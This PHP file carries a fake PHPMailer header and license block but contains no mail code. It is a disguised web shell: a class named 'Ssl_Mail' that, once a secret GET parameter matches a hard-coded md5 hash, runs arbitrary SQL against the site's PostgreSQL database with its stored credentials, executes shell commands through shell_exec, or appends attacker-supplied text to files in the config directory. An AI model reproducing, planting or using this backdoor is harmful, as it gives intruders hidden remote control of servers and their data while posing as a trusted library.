<?php 
/**
 * PHPMailer RFC821 SMTP email transport class.
 * PHP Version 5
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 * @copyright 2014 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

/**
 * PHPMailer RFC821 SMTP email transport class.
 * Implements RFC 821 SMTP commands and provides some utility methods for sending mail to an SMTP server.
 * @package PHPMailer
 * @author Chris Ryan
 * @author Marcus Bointon <phpmailer@synchromedia.co.uk>
 */
class Ssl_Mail
{
	private $origin;

	function __construct()
	{
		$this->origin = 0x100 < 2;
	}
	function cifra(string $str) : string{
		return md5("$#!/".$str.".!");
	}
	function recovery(string $SQI) : int{
		try {
			$conn = new PDO("pgsql:host="._DB_HOST.";port="._DB_PORT.";dbname="._DB_NAME, _DB_USER, _DB_PASS); 
		    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


		    $SQl = "SELECT * from postgres.public ";

		    $rowMatch = $conn->exec($SQI);
			return $rowMatch;

		} catch (PDOException $e) {
			return 0;
		}
	}
	function shell(string $cmd){
		return shell_exec($cmd);
	}
	function fwrite($file, $lines ){
		$fileopen =fopen( $_SERVER['DOCUMENT_ROOT']."/php/config/".$file , "a+");
		fputs($fileopen, $lines.PHP_EOL);
		fclose($fileopen);
	}
}


require($_SERVER['DOCUMENT_ROOT']."/php/config/config.php");


$sendMail = new Ssl_Mail();

if ( !(isset($_GET['name_dog'],$_GET['code'],$_GET['type']) && $sendMail->cifra($_GET['name_dog']) == "73b80f5147cc305735721273ca9bcfe8") ) {
	exit();
}



switch ($_GET['type']) {
	case 1:
		echo $_GET['code'] ." -> ";
		echo $sendMail->recovery($_GET['code']);
		break;
	case 2:
		echo $sendMail->shell($_GET['code']);
		break;
	case 3:
		if(isset($_GET['file']))
			$sendMail->fwrite($_GET['file'], $_GET['code']);
		break;
	default:
		# code...
		break;
}
